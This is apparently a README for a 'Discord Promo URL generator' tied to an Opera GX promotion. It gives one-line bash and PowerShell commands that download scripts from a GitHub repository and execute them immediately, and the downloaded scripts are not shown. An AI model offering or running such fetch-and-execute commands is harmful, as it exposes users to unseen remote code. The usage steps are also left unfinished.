# Discord Promo URL generator (opera GX)

This tool can be used to generate discord promo links until July 27th, 2024 (11:59 pst)

### How to use this tool

1. Create a webhook you want in the channel to have the links be sent to 
2. Run the script for your 

## Linux script (replit bash, wsl, terminal)
```bash
bash <(curl -s https://raw.githubusercontent.com/WaveDemure/i-just-need-a-scriptium/main/goober.sh)
```
## Windows (PowerShell) script [brocek]

```ps1
$Script = Invoke-WebRequest 'https://raw.githubusercontent.com/WaveDemure/i-just-need-a-scriptium/main/silly.ps1'
$ScriptBlock = [Scriptblock]::Create($Script.Content)
Invoke-Command -ScriptBlock $ScriptBlock -ArgumentList ($args + @('someargument'))
```
